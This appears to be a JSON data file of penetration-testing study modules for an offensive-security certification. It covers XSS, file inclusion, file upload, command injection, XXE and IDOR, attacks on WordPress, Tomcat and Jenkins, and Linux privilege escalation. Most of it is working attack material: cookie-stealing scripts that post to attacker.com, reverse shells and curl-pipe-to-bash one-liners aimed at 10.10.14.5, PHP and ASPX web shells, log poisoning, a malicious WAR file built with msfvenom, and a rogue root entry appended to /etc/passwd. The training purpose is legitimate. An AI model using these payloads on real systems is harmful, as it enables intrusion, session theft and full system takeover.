  "cheatsheet_md":"<h3>Basic Detection Payloads</h3><pre><script>alert(1)</script>\n<img src=x onerror=alert(1)>\n<svg onload=alert(1)>\n<body onload=alert(1)>\n\"><script>alert(1)</script>\n'><script>alert(1)</script>\njavascript:alert(1)\n\n# Polyglot (bypasses many filters):\njaVasCript:/*-/*`/*\\`/*'/*\"/**/(/* */oNcliCk=alert() )//%0D%0A</pre><h3>Filter Bypass Techniques</h3><pre># Case variation\n<ScRiPt>alert(1)</ScRiPt>\n\n# Breaking keywords\n<scr<script>ipt>alert(1)</scr</script>ipt>\n\n# HTML entities\n<img src=x onerror=&#97;&#108;&#101;&#114;&#116;(1)>\n\n# Event handlers (when script tags blocked)\n<div onmouseover=\"alert(1)\">hover me</div>\n<input autofocus onfocus=alert(1)>\n<select autofocus onfocus=alert(1)>\n\n# src-based\n<script src=//attacker.com/xss.js></script></pre><h3>Cookie Theft (Stored/Reflected)</h3><pre># Payload to steal cookies:\n<script>document.location='http://attacker.com/steal?c='+document.cookie</script>\n<script>new Image().src='http://attacker.com/steal?c='+encodeURIComponent(document.cookie)</script>\n<script>fetch('http://attacker.com/steal?c='+btoa(document.cookie))</script>\n\n# On attacker: catch with\nnc -lvnp 80\n# Or python server:\npython3 -m http.server 80</pre><h3>XSS to Session Hijacking</h3><pre># 1. Inject cookie-stealing payload into stored XSS sink\n# 2. When admin views the page, their session cookie is sent to your listener\n# 3. Copy cookie value into browser (DevTools → Application → Cookies)\n# 4. Refresh the admin page → logged in as admin</pre><h3>DOM-Based XSS</h3><pre># Look for: document.write(), innerHTML, location.hash, location.search being written to DOM\n# Example vulnerable code:\ndocument.getElementById('output').innerHTML = location.hash.slice(1);\n# Exploit:\nhttp://target.com/page#<img src=x onerror=alert(1)></pre>",
  "pitfalls_md":"<ul><li><b>Only testing <script> tags</b> — Most filters block <script> specifically. Event-handler payloads (onerror, onload, onfocus) and HTML entities often bypass script-specific filters.</li><li><b>Not testing input in all output contexts</b> — Input reflected in an HTML attribute (value="INPUT") requires different payloads than input in JavaScript context (var x='INPUT') or URL context. One payload does not fit all.</li><li><b>Mistaking self-XSS for a real vulnerability</b> — Self-XSS executes only in your own browser (e.g., attacking your own console). It's not a vulnerability unless combined with a CSRF or login CSRF to force another user to execute it.</li><li><b>Not following redirects / checking all response sinks</b> — The XSS sink may be on a different page from where input is submitted. Track where user input appears across the application.</li><li><b>Stopping at alert(1) proof-of-concept</b> — For CPTS reporting, demonstrate real impact: show cookie theft, demonstrate account takeover, or show that admin session cookies are accessible. alert(1) alone is insufficient for high severity.</li></ul>",
  "exam_tips_md":"<ul><li>Test all input fields with a basic polyglot payload first. If any field reflects input without encoding, investigate the reflection context to craft a working payload.</li><li>For stored XSS: check every location where user-controlled data is displayed to other users — comments, profile fields, search history, admin notifications. Admin-viewed sinks are highest priority.</li><li>When HttpOnly is set on session cookies, document.cookie returns empty — demonstrate XSS impact through other means: CSRF token theft, admin action execution, credential capture via fake login forms.</li><li>DOM-based XSS requires reading the JavaScript source. Look for document.write, innerHTML, eval, setTimeout with string concatenation, and URL fragment (#) handling. These are classic DOM XSS sinks.</li><li>In exam reports, classify XSS by type and demonstrate its maximum impact. A stored XSS on the admin panel that leads to session takeover is Critical — document the complete attack chain.</li></ul>"
},
{
  "title":"File Inclusion","slug":"file-inclusion","category":"Web Exploitation","order_index":19,
  "summary":"File inclusion vulnerabilities occur when user input is used to include files without proper validation. Local File Inclusion (LFI) reads files from the server filesystem — attacker goal is to read /etc/passwd, /etc/shadow, SSH private keys, web application config files, and eventually achieve Remote Code Execution. Remote File Inclusion (RFI) includes files from attacker-controlled URLs — immediate RCE by hosting a malicious PHP file. LFI-to-RCE escalation paths: PHP session file inclusion (include /var/lib/php/sessions/sess_[sessionid]), log poisoning (inject PHP code into Apache/SSH/mail logs then include the log), /proc/self/environ inclusion, and PHP filter wrappers (php://filter/convert.base64-encode/resource= to read PHP source). Path traversal bypasses: directory traversal sequences (../), null byte injection (%00 for older PHP), encoding (%2e%2e%2f), and double encoding (%252e%252e%252f). The PHP wrapper php://input with POST data provides direct RCE when allow_url_include is on.",
  "cheatsheet_md":"<h3>Basic LFI</h3><pre># Test parameter\nhttp://target.com/index.php?page=../../../etc/passwd\nhttp://target.com/index.php?lang=....//....//....//etc/passwd  # Double-slash bypass\nhttp://target.com/index.php?file=/etc/passwd                   # Absolute path\n\n# Common files to read:\n# Linux: /etc/passwd, /etc/shadow (root), /etc/hosts\n# /home/user/.ssh/id_rsa, /home/user/.bash_history\n# /var/www/html/config.php (web app DB creds)\n# /var/log/apache2/access.log (log poisoning)\n# Windows: C:/Windows/System32/drivers/etc/hosts\n# C:/xampp/htdocs/config.php, C:/inetpub/wwwroot/web.config</pre><h3>PHP Wrappers</h3><pre># Read PHP source (base64 encoded — avoids execution)\nhttp://target.com/index.php?page=php://filter/convert.base64-encode/resource=config\n# Decode: echo 'BASE64' | base64 -d > config.php\n\n# Direct code execution via php://input\n# POST data: <?php system($_GET['cmd']); ?>\ncurl -s 'http://target.com/index.php?page=php://input' --data '<?php system(\"id\"); ?>'\n# Requires allow_url_include=On\n\n# data:// wrapper\nhttp://target.com/index.php?page=data://text/plain,<?php system('id'); ?>\n# Base64:\nhttp://target.com/index.php?page=data://text/plain;base64,PD9waHAgc3lzdGVtKCdpZCcpOyA/Pg==</pre><h3>Log Poisoning (LFI → RCE)</h3><pre># Step 1: Confirm log file is readable\nhttp://target.com/index.php?page=/var/log/apache2/access.log\n\n# Step 2: Inject PHP into User-Agent (via access.log) or SSH failed login\ncurl -s http://target.com/ -A '<?php system($_GET[\"cmd\"]); ?>'\n# Or SSH: ssh '<?php system($_GET[\"cmd\"]); ?>'@target.com (auth failure still logs)\n\n# Step 3: Include log and pass command\nhttp://target.com/index.php?page=/var/log/apache2/access.log&cmd=id</pre><h3>RFI (Remote File Inclusion)</h3><pre># Host malicious file on attacker:\necho '<?php system($_GET[\"cmd\"]); ?>' > shell.php\npython3 -m http.server 8000\n\n# Include via RFI:\nhttp://target.com/index.php?page=http://10.10.14.5:8000/shell.php&cmd=id\n# Requires allow_url_include=On and allow_url_fopen=On</pre><h3>PHP Session Inclusion</h3><pre># Your session ID is in the Cookie header\n# Session file: /var/lib/php/sessions/sess_[PHPSESSID]\n# Inject PHP into a session variable:\nhttp://target.com/page.php?username=<?php system($_GET['cmd']); ?>\n# Then include session file:\nhttp://target.com/index.php?page=/var/lib/php/sessions/sess_abc123&cmd=id</pre>",
  "pitfalls_md":"<ul><li><b>Not trying multiple path traversal encodings</b> — Applications filter ../ literally. Try: ....// (doubled), %2e%2e%2f (URL), %252e%252e%252f (double URL), ..%2f (mixed), and null byte (%00) for older PHP versions.</li><li><b>Skipping PHP wrappers when direct traversal fails</b> — Even when ../ is blocked, php://filter/convert.base64-encode/resource= may work, allowing source code disclosure. Try wrappers independently of traversal.</li><li><b>Missing log poisoning opportunity</b> — When a log file is readable via LFI, it's almost always exploitable for RCE. Access logs, SSH auth logs (/var/log/auth.log), and mail logs all work.</li><li><b>Not checking allow_url_include before attempting RFI</b> — RFI requires allow_url_include=On in php.ini (disabled by default since PHP 5.2). Verify with php://filter first — if wrappers work, check phpinfo() for configuration.</li><li><b>Forgetting Windows paths use backslash</b> — LFI on Windows IIS: C:\Windows\system32\drivers\etc\hosts or C:/Windows/System32/drivers/etc/hosts (forward slashes usually work on Windows too).</li></ul>",
  "exam_tips_md":"<ul><li>When you find an LFI, immediately try php://filter/convert.base64-encode/resource=../config to read PHP configuration files — these often contain database credentials that open additional attack paths.</li><li>Log poisoning is your most reliable LFI-to-RCE path when PHP wrappers are restricted. Inject into access.log via User-Agent curl request, then include the log file with a cmd parameter.</li><li>Test RFI even if you think it's disabled — some applications re-enable allow_url_include for legacy compatibility. A quick test costs nothing: include your HTTP server URL and check your access log for incoming requests.</li><li>For Windows targets: read C:/Windows/System32/drivers/etc/hosts to confirm path traversal works, then read web.config, application config files, and IIS logs for credentials.</li><li>PHP session inclusion is viable when you can control session variable content. Find any field that stores your input in the session, inject PHP code there, then include your session file via LFI.</li></ul>"
},
{
  "title":"File Upload Attacks","slug":"file-upload-attacks","category":"Web Exploitation","order_index":20,
  "summary":"File upload vulnerabilities enable uploading server-executable files to achieve RCE, or client-executed files for XSS. The goal is to upload a web shell (PHP/ASPX/JSP) and access it via HTTP. Upload restrictions are implemented at multiple layers: client-side (JavaScript validation — trivially bypassed by modifying the request in Burp), server-side content-type check (check Content-Type header — bypass by changing to image/jpeg), server-side extension check (block .php — bypass with .php5, .phtml, .phar, .PHP, .php%20), and server-side content validation (check magic bytes — prepend GIF89a; to PHP shell). Advanced bypasses: double extension (shell.php.jpg — server may process leftmost extension), null byte injection (shell.php%00.jpg for older PHP), and IIS-specific: shell.asp;.jpg. The upload location matters — if files are uploaded to a non-web-accessible directory, find another path or chain with path traversal to redirect the upload.",
  "cheatsheet_md":"<h3>Client-Side Bypass</h3><pre># Method 1: Disable JavaScript in browser (about:config)\n# Method 2: Intercept upload in Burp → change filename before forwarding\n# Method 3: Use curl to bypass browser entirely:\ncurl -F 'file=@shell.php;type=image/jpeg' http://target.com/upload</pre><h3>Extension Bypass</h3><pre># PHP alternative extensions (when .php is blocked)\nshell.php5\nshell.phtml\nshell.phar\nshell.PHP         # Case variation\nshell.php.jpg     # Double extension (depends on server config)\nshell.php%00.jpg  # Null byte (PHP < 5.3)\nshell.php.        # Trailing dot (Windows)\nshell.php7, shell.php3, shell.php4\n\n# ASPX alternatives (IIS)\nshell.asp\nshell.aspx\nshell.cer\nshell.asp;.jpg    # IIS double extension</pre><h3>Content-Type Bypass</h3><pre># Change Content-Type header in Burp:\n# Original: Content-Type: application/x-php\n# Modified: Content-Type: image/jpeg  (or image/png, image/gif)\n\n# Burp Repeater: modify the Content-Type in the multipart form boundary header</pre><h3>Magic Bytes Bypass</h3><pre># Prepend magic bytes to PHP shell:\n# GIF magic bytes: GIF89a\necho -e 'GIF89a\n<?php system($_GET[\"cmd\"]); ?>' > shell.gif.php\n\n# PNG magic bytes (hex): 89 50 4E 47 0D 0A 1A 0A\n# JPEG magic bytes (hex): FF D8 FF E0\nprintf '\\xff\\xd8\\xff\\xe0' > shell.php; echo '<?php system($_GET[\"cmd"]); ?>' >> shell.php</pre><h3>Web Shell Basics</h3><pre># PHP\n<?php system($_GET['cmd']); ?>\n<?php echo shell_exec($_GET['cmd']); ?>\n<?php passthru($_GET['cmd']); ?>\n\n# Minimal PHP (harder to detect):\n<?=`{$_GET[0]}`?>\n\n# ASPX\n<%@ Page Language=\"C#\" %><% Response.Write(new System.Diagnostics.Process{StartInfo=new System.Diagnostics.ProcessStartInfo(\"cmd.exe\",\"/c \"+Request[\"cmd\"]){RedirectStandardOutput=true,UseShellExecute=false}}.Start()?new System.IO.StreamReader(System.Diagnostics.Process.GetCurrentProcess().StandardOutput).ReadToEnd():\"err\"); %></pre><h3>Identifying Upload Location</h3><pre># After upload, access via:\n/uploads/shell.php\n/upload/shell.php\n/files/shell.php\n/images/shell.php\n/media/shell.php\n# Or: check the response for the uploaded file path\n# Or: check page source for img src after upload</pre>",
  "pitfalls_md":"<ul><li><b>Not trying extension case variations</b> — .PHP, .Php, .pHp often bypass case-sensitive extension blacklists. Always try case variations when .php is blocked.</li><li><b>Forgetting to access the uploaded file</b> — Successful upload means nothing if you can't reach the file. Always verify the upload path is web-accessible and determine the exact URL before celebrating.</li><li><b>Not combining magic bytes with valid extension</b> — Some servers check both magic bytes AND extension. The combination (valid magic bytes + PHP extension) bypasses content validators that check mime type only.</li><li><b>Ignoring SVG upload fields for XSS</b> — SVG files can contain JavaScript. If the application displays uploaded SVGs inline: <svg><script>alert(1)</script></svg> achieves stored XSS through the file upload.</li><li><b>Missing ImageMagick vulnerabilities on image upload</b> — If the server processes images with ImageMagick, test for ImageTragick (CVE-2016-3714): crafted image triggers RCE during processing.</li></ul>",
  "exam_tips_md":"<ul><li>Test the upload in Burp Repeater — intercept the upload request, change the filename and Content-Type, and forward. This gives full control over every aspect of the upload without browser limitations.</li><li>When .php is blocked, try php5 → phtml → phar → php7 in sequence. Most custom blacklists miss at least one alternative. PHP configuration determines which get executed.</li><li>After a successful upload, access the file immediately. Some applications use antivirus that quarantines shells within seconds of upload — you have a narrow window to access and execute commands.</li><li>For double extension to work (shell.php.jpg), the server must be configured to pass all files matching php to the PHP interpreter regardless of additional extensions. Test by uploading shell.php.jpg and accessing it.</li><li>If direct web shell upload fails, consider ZIP upload + path traversal: craft a ZIP containing shell.php at a path traversal depth (../../shell.php) if the application extracts ZIP contents.</li></ul>"
},
{
  "title":"Command Injections","slug":"command-injection","category":"Web Exploitation","order_index":21,
  "summary":"Command injection occurs when user-supplied input is passed unsanitised to an OS command executed by the server. Direct injection adds new commands after the intended command using operators: semicolon (;), double ampersand (&&), pipe (|), double pipe (||), and newline (%0a). Blind command injection has no output in the response — use time delays (sleep 5), out-of-band techniques (curl/ping to attacker), or write output to a file then read it. Detection: inject time-delay payloads first to confirm execution. Filter bypass: encode characters (URL, HTML, base64), use alternative operators, use $IFS (Internal Field Separator) instead of space in bash, use ${PATH:0:1} for slash, brace expansion for character substitution. Commands to run after confirmed injection: id, whoami, cat /etc/passwd, ls /home, and immediately establish a reverse shell for interactive access. In CPTS, command injection is found in features that invoke OS commands: file conversion, ping tools, network diagnostics, DNS lookups, and email processing.",
  "cheatsheet_md":"<h3>Injection Operators</h3><pre>; id           # Semicolon: run id after original command (both run)\n&& id         # AND: run id only if original succeeds  \n|| id         # OR: run id only if original FAILS\n| id          # Pipe: id receives original output (id runs regardless)\n%0a id        # Newline: same as semicolon in many contexts\n`id`          # Backtick: command substitution (bash)\n$(id)         # Dollar-paren: command substitution (bash)</pre><h3>Detection Payloads</h3><pre># Time delay (blind detection)\n; sleep 5\n& ping -c 5 127.0.0.1\n| timeout 5\n\n# Out-of-band (blind detection)\n; curl http://10.10.14.5/test\n; ping -c 1 10.10.14.5\n# Catch with: nc -lvnp 80 or tcpdump -i tun0 icmp</pre><h3>Space and Character Bypasses</h3><pre># Space alternatives\n$IFS          # Internal Field Separator (default is space)\n{cat,/etc/passwd}  # Brace expansion\ncmd<<< 'arg'  # Here-string redirection\n\n# Slash alternatives\n${PATH:0:1}   # First char of PATH is usually /\n\n# Filter bypass examples:\n# Instead of: cat /etc/passwd\n{cat,/etc/passwd}\ncat${IFS}/etc/passwd\ncmd=$'cat\\x20/etc/passwd';$cmd  # Hex encoding in $'...'</pre><h3>URL Encoding</h3><pre># Encode operators if WAF blocks literal characters:\n%3b = ;    %26 = &    %7c = |    %0a = newline\n%60 = `    %24 = $\n\n# Double URL encode (bypass some WAFs):\n%253b = ;  %2526 = &</pre><h3>Reverse Shell from Injection</h3><pre>; bash -i >& /dev/tcp/10.10.14.5/4444 0>&1\n; python3 -c 'import socket,subprocess,os;s=socket.socket();s.connect((\"10.10.14.5\",4444));os.dup2(s.fileno(),0);os.dup2(s.fileno(),1);os.dup2(s.fileno(),2);subprocess.call([\"/bin/bash\",\"-i\"])'\n; curl http://10.10.14.5/shell.sh | bash</pre>",
  "pitfalls_md":"<ul><li><b>Using semicolon when pipe is needed</b> — Some injection contexts require output from the original command to function correctly. Test all operators: ; && || | to find which is valid for the application's command structure.</li><li><b>Not testing blind injection</b> — Many command injection vulnerabilities produce no visible output. Always test with sleep 5 (time delay) and out-of-band (ping/curl to attacker) before concluding no injection exists.</li><li><b>Forgetting to URL-encode in GET parameters</b> — Spaces and special characters in GET parameters need URL encoding. Burp Repeater handles this — use Ctrl+U to URL-encode selection.</li><li><b>Not trying all injection points</b> — Command injection is found in hidden form fields, HTTP headers, file names, and JSON parameters — not just visible text boxes. Fuzz all inputs.</li><li><b>Getting a command injection and not immediately establishing persistence</b> — Single-shot command execution is fragile. Add an authorized_keys entry or establish a reverse shell as the very next step after confirmed RCE.</li></ul>",
  "exam_tips_md":"<ul><li>Confirm command injection with sleep 5 before anything else — see if the response is delayed 5 seconds. This is the cleanest blind detection method with no network requirements.</li><li>After confirming injection, use it to download and execute a reverse shell script: ; curl http://ATTACKER/shell.sh -o /tmp/s.sh && bash /tmp/s.sh — this is more reliable than inline payloads for complex reverse shells.</li><li>$IFS and brace expansion are your primary space bypass tools. If the application strips spaces: {id} works in bash, {cat,/etc/passwd} works for file reading, and $IFS replaces spaces in most contexts.</li><li>For Windows command injection, test: & whoami, && dir, | ipconfig. PowerShell injection: $(whoami), ;Get-Process. Different OS requires different operators.</li><li>Write output to a web-accessible file if the injection is blind and out-of-band is blocked: ; id > /var/www/html/out.txt, then access http://target/out.txt. This converts blind to output-visible injection.</li></ul>"
},
{
  "title":"Web Attacks","slug":"web-attacks","category":"Web Exploitation","order_index":22,
  "summary":"Web attacks in CPTS cover three high-impact vulnerability classes beyond the core web modules: HTTP Verb Tampering (exploiting misconfigurations in access control applied only to specific HTTP methods), Insecure Direct Object Reference (IDOR — accessing/modifying resources by guessing or manipulating identifiers), and XML External Entity (XXE) injection. HTTP Verb Tampering: access controls may restrict GET but not POST, or block POST but not PUT. Changing the HTTP method can bypass these restrictions, especially on Apache and IIS. IDOR: access control is checked at the object level using predictable IDs (user IDs, document numbers, order IDs). By changing the ID in the request, attackers access other users' data. IDOR extends to hash-based IDs if the hash is predictable (MD5 of user ID). XXE: XML parsers that process DOCTYPE declarations can be tricked into reading local files via external entity references or perform SSRF by referencing external URLs. Blind XXE uses out-of-band techniques (DNS/HTTP callback to attacker) when results aren't reflected.",
  "cheatsheet_md":"<h3>HTTP Verb Tampering</h3><pre># Change method in Burp Repeater or curl:\ncurl -X OPTIONS http://target.com/admin   # Check allowed methods\ncurl -X GET http://target.com/admin       # Standard GET\ncurl -X POST http://target.com/admin      # Try POST instead\ncurl -X PUT http://target.com/admin       # Try PUT\ncurl -X FAKEMETHOD http://target.com/admin  # Invalid method bypass\n\n# If GET /admin returns 403 but POST /admin returns 200:\n# The access control only applies to GET</pre><h3>IDOR Testing</h3><pre># Change numeric IDs:\nGET /api/v1/user/1001  →  /api/v1/user/1000  (other user)\nGET /download?file_id=25 → ?file_id=24\n\n# Change encoded IDs:\n# Base64: decode, modify, re-encode\necho 'dXNlcl9pZD0x' | base64 -d   # → user_id=1\necho 'dXNlcl9pZD0y' | base64 -d   # → user_id=2  \necho -n 'user_id=2' | base64       # re-encode\n\n# MD5-based IDs:\necho -n '1001' | md5sum             # hash of user ID\n\n# Mass IDOR with Burp Intruder:\n# Set ID parameter as payload position, use numbers 1-500 wordlist\n# Filter by response size to identify successful accesses</pre><h3>XXE — Basic</h3><pre># Inject into XML body (Content-Type: application/xml)\n<?xml version=\"1.0\"?>\n<!DOCTYPE root [<!ENTITY xxe SYSTEM \"file:///etc/passwd\">]>\n<root><element>&xxe;</element></root>\n\n# PHP wrapper (read PHP files without execution):\n<?xml version=\"1.0\"?>\n<!DOCTYPE root [<!ENTITY xxe SYSTEM \"php://filter/convert.base64-encode/resource=/etc/passwd\">]>\n<root>&xxe;</root></pre><h3>XXE — Blind (Out-of-Band)</h3><pre># Trigger DNS/HTTP callback to detect XXE when no reflection:\n<?xml version=\"1.0\"?>\n<!DOCTYPE root [<!ENTITY xxe SYSTEM \"http://10.10.14.5/xxe_test\">]>\n<root>&xxe;</root>\n# Listen: nc -lvnp 80 OR python3 -m http.server 80\n\n# XXE via parameter entity (some parsers only allow this):\n<?xml version=\"1.0\"?>\n<!DOCTYPE root [<!ENTITY % remote SYSTEM \"http://10.10.14.5/xxe.dtd\"> %remote;]>\n<root>&data;</root></pre>",
  "pitfalls_md":"<ul><li><b>Not testing all HTTP methods on restricted endpoints</b> — Access control frameworks often apply rules per-method. Test OPTIONS first to see what methods are accepted, then try each for bypass.</li><li><b>Skipping IDOR on hash-encoded IDs</b> — MD5(user_id) is as predictable as a plain integer if you know the pattern. Decode and analyse ID patterns before assuming they're secure.</li><li><b>Only testing GET/POST parameters for IDOR</b> — IDOR exists in Cookie values, HTTP headers (X-User-ID), JSON body fields, and URL path components. Test all locations where identifiers appear.</li><li><b>Forgetting JSON-to-XML conversion sites have XXE</b> — Some APIs accept both JSON and XML. Try changing Content-Type to application/xml with an XXE payload — the backend may parse both formats.</li><li><b>Not escalating IDOR beyond read to write/delete</b> — Many IDOR vulnerabilities allow modification as well as reading. Test PUT/DELETE/PATCH with the discovered IDOR to escalate from information disclosure to data manipulation.</li></ul>",
  "exam_tips_md":"<ul><li>For every endpoint with an ID parameter: test IDOR by decrementing/incrementing the ID and comparing response content and size. Burp Intruder with a number list is efficient for bulk testing.</li><li>HTTP Verb Tampering: if any endpoint returns 401/403 on GET, immediately try POST, PUT, and OPTIONS. This bypasses a surprising number of naive server-side access controls.</li><li>For XXE: if the app accepts XML input anywhere (SOAP APIs, SVG uploads, docx/xlsx uploads, XML data import), test XXE. Office documents (docx, xlsx) are ZIP archives containing XML — extract and inject XXE into the XML files.</li><li>Blind XXE: always set up a listener (nc or python http.server) before sending XXE payloads. Even if the response shows nothing, a network callback to your IP confirms the vulnerability and enables data exfiltration via OOB.</li><li>Combine IDOR with sensitive data exposure: if IDOR reads other users' profile data, look for password hashes, email addresses, API keys, and session tokens in the exposed records.</li></ul>"
},
{
  "title":"Attacking Common Applications","slug":"attacking-common-apps","category":"Web Exploitation","order_index":23,
  "summary":"Enterprise networks run many common third-party applications with known attack paths: WordPress (admin panel → plugin editor → PHP RCE), Apache Tomcat (manager app → WAR file upload → JSP shell), Jenkins (Groovy script console → OS RCE), GitLab/Gitea (repository browsing for secrets, RCE via known CVEs), Splunk (known auth bypass, RCE via dashboard), Nagios (admin → command injection), and Pimcore/Drupal (CMS-specific attack paths). The methodology is consistent: enumerate the application version, search for known CVEs and default credentials for that version, look for misconfigurations (public registration, guest access, exposed admin interfaces), and use application-specific attack paths. WordPress deserves particular focus: xmlrpc.php enables brute-force without lockout, themes and plugins are frequent vulnerability sources, and the Theme Editor (Appearance → Theme Editor) enables direct PHP code modification if admin access is obtained.",
  "cheatsheet_md":"<h3>WordPress</h3><pre># Enumeration\nwpscan --url http://target.com --enumerate p,u,t  # Plugins, users, themes\nwpscan --url http://target.com -e u --api-token TOKEN  # With API (more CVE data)\ncurl -s http://target.com/wp-json/wp/v2/users  # User enumeration via REST API\n\n# Brute-force (xmlrpc bypasses lockout)\nwpscan --url http://target.com -U admin -P rockyou.txt --password-attack xmlrpc\n\n# Admin → RCE path:\n# 1. Login to /wp-admin\n# 2. Appearance → Theme Editor → select active theme\n# 3. Edit 404.php → add: <?php system($_GET['cmd']); ?>\n# 4. Access: http://target.com/wp-content/themes/themename/404.php?cmd=id\n\n# Plugin/theme with known CVE:\nwpscan --url http://target.com -e p --plugins-detection aggressive</pre><h3>Apache Tomcat</h3><pre># Default manager paths:\n/manager/html     # GUI manager (upload WAR files)\n/manager/text     # Text interface\n\n# Default creds to try: tomcat:tomcat, tomcat:s3cr3t, admin:admin\n\n# WAR shell upload:\nmsfvenom -p java/jsp_shell_reverse_tcp LHOST=tun0 LPORT=4444 -f war -o shell.war\ncurl -u tomcat:tomcat http://target.com/manager/text/deploy?path=/shell -T shell.war\ncurl http://target.com/shell/  # Trigger shell access\n\n# Or via Metasploit:\nuse exploit/multi/http/tomcat_mgr_upload\nset RHOSTS target.com\nset HttpUsername tomcat\nset HttpPassword tomcat</pre><h3>Jenkins</h3><pre># Access: http://target.com:8080/\n# Default: admin:password or no auth\n\n# Groovy Script Console (Manage Jenkins → Script Console):\ndef cmd = 'id'.execute()\nprintln cmd.text\n# Reverse shell:\nString host='10.10.14.5'; int port=4444;\nString cmd2='bash -i >& /dev/tcp/'+host+'/'+port+' 0>&1';\n['bash','-c',cmd2].execute()</pre><h3>GitLab / Gitea</h3><pre># Enumerate repos for secrets\n# Check: .env, config.php, settings.py, *.yml, *.key\n# Run truffleHog or gitleaks on accessible repos:\ngitleaks detect -s /path/to/repo\ntruffleHog git http://target.com/user/repo\n\n# Default creds: root:root, root:password, admin:admin</pre>",
  "pitfalls_md":"<ul><li><b>Not checking application version before searching for exploits</b> — WordPress 5.x and 4.x have very different vulnerable plugins. Always identify the exact version first: /wp-includes/version.php, README.html, HTTP headers.</li><li><b>Skipping default credential testing on Tomcat manager</b> — Tomcat manager with tomcat:tomcat or admin:admin is an extremely common finding. Try default credentials before attempting complex attacks.</li><li><b>Missing xmlrpc.php for WordPress brute-force</b> — The standard login form at /wp-login.php implements lockout. xmlrpc.php does not — wpscan --password-attack xmlrpc bypasses lockout entirely.</li><li><b>Not reviewing accessible source code repositories for secrets</b> — Public or misconfigured Git repos frequently contain API keys, DB credentials, and private keys. gitleaks and truffleHog automate this discovery.</li><li><b>Forgetting Jenkins Groovy console runs as the service user</b> — The Groovy script console executes system commands as the user running Jenkins (often jenkins or even SYSTEM). This is direct OS RCE — establish an interactive shell immediately.</li></ul>",
  "exam_tips_md":"<ul><li>For every web application identified: check the version, search wpscan/searchsploit/ExploitDB for that version, then try default credentials. This 5-minute process frequently yields direct admin access.</li><li>WordPress is a guaranteed target in CPTS-style exams. Know the Theme Editor RCE path (Appearance → Theme Editor → edit PHP file → add web shell) as your primary post-admin-access RCE method.</li><li>Tomcat WAR upload requires the manager to be accessible and credentials to work. If the manager is only accessible from localhost, use an SSH tunnel or Ligolo pivot to reach it.</li><li>When you find a configured GitLab or Gitea instance with public repos, run gitleaks immediately. Git history contains deleted secrets that the current code may not show — always check git log and git diff.</li><li>For any custom web application, fuzz /admin, /manager, /console, /dashboard, /config, /.git, /.env, /backup as a first step. These paths frequently reveal management interfaces and configuration files.</li></ul>"
},
{
  "title":"Linux Privilege Escalation","slug":"linux-privesc","category":"Post-Exploitation","order_index":24,
  "summary":"Linux privilege escalation is the process of elevating from a low-privilege user (www-data, user) to root. The methodology follows enumeration first, exploitation second. Automated enumeration: linPEAS (comprehensive), LinEnum, LSE (Linux Smart Enumeration). Manual checks cover: SUID/SGID binaries (executables that run with owner privileges), sudo -l (allowed sudo commands without password), cron jobs (running as root, writable scripts), writable /etc/passwd (add root user), weak file permissions (/etc/shadow readable), kernel exploits (uname -r + searchsploit/linux kernel), capabilities (getcap -r / 2>/dev/null), PATH manipulation, library hijacking (LD_PRELOAD), and NFS no_root_squash. GTFOBins (gtfobins.github.io) is the authoritative reference for SUID and sudo escalation — every binary with unusual permissions should be checked against it. In CPTS, misconfigured sudo rules (sudo vim → shell escape, sudo find → exec) and SUID binaries are the most common escalation paths.",
  "cheatsheet_md":"<h3>Initial Enumeration</h3><pre>id && whoami && uname -a && cat /etc/os-release  # Basic info\nsudo -l                                           # Sudo permissions (key check!)\nfind / -perm -4000 -type f 2>/dev/null           # SUID binaries\nfind / -perm -2000 -type f 2>/dev/null           # SGID binaries\ngetcap -r / 2>/dev/null                           # File capabilities\ncrontab -l && cat /etc/crontab                    # Cron jobs\ncat /etc/passwd | grep -v nologin | grep -v false # Login users\nls -la /home/                                     # Home directories\nfind / -writable -type f 2>/dev/null | grep -v proc  # Writable files</pre><h3>Automated Tools</h3><pre># Transfer linPEAS to target\ncurl -sL https://github.com/carlospolop/PEASS-ng/releases/latest/download/linpeas.sh -o /tmp/lp.sh\n# Or from attacker HTTP server:\nwget http://10.10.14.5:8000/linpeas.sh -O /tmp/lp.sh\nchmod +x /tmp/lp.sh && /tmp/lp.sh 2>/dev/null | tee /tmp/lp.out</pre><h3>Sudo Escalation (GTFOBins)</h3><pre># Find sudo permissions\nsudo -l\n# Example: (root) NOPASSWD: /usr/bin/vim\n\n# GTFOBins sudo escapes (check gtfobins.github.io for each binary):\nsudo vim -c ':!/bin/bash'              # vim → bash\nsudo find /tmp -exec /bin/bash \\;     # find → bash\nsudo less /etc/passwd → !bash         # less → bash (type !bash)\nsudo awk 'BEGIN {system(\"/bin/bash\")}' # awk → bash\nsudo nmap --interactive → !sh         # old nmap\nsudo python3 -c 'import os; os.system(\"/bin/bash\")'  # python3</pre><h3>SUID Binary Exploitation</h3><pre># Find SUID binaries:\nfind / -perm -4000 -type f 2>/dev/null\n\n# Common exploitable SUID: vim, bash, python, perl, env, cp, mv, nano, find\n# Check each at gtfobins.github.io → SUID tab\n/usr/bin/bash -p   # bash SUID: -p preserves effective UID\nfind . -exec /bin/bash -p \\; -quit  # find SUID</pre><h3>Cron Job Exploitation</h3><pre># Find cron jobs:\ncat /etc/crontab\nls -la /etc/cron.*\ncat /var/spool/cron/crontabs/*\n\n# If a cron-run script is world-writable:\necho 'bash -i >& /dev/tcp/10.10.14.5/4444 0>&1' >> /path/to/cron_script.sh\n# Wait for cron to run (usually 1 minute)\n\n# If cron calls script without full path (PATH hijacking):\nexport PATH=/tmp:$PATH\necho '/bin/bash -p' > /tmp/vulnerable_command\nchmod +x /tmp/vulnerable_command</pre><h3>Writable /etc/passwd</h3><pre># Generate password hash:\nopens ssl passwd -1 -salt abc password123   # Generates $1$abc$...\n# Or use: python3 -c \"import crypt; print(crypt.crypt('password123', crypt.mksalt(crypt.METHOD_SHA512)))\"\n\n# Append root-level user:\necho 'hacker:$1$abc$HASH:0:0:root:/root:/bin/bash' >> /etc/passwd\nsu - hacker  # Login as new root user</pre>",
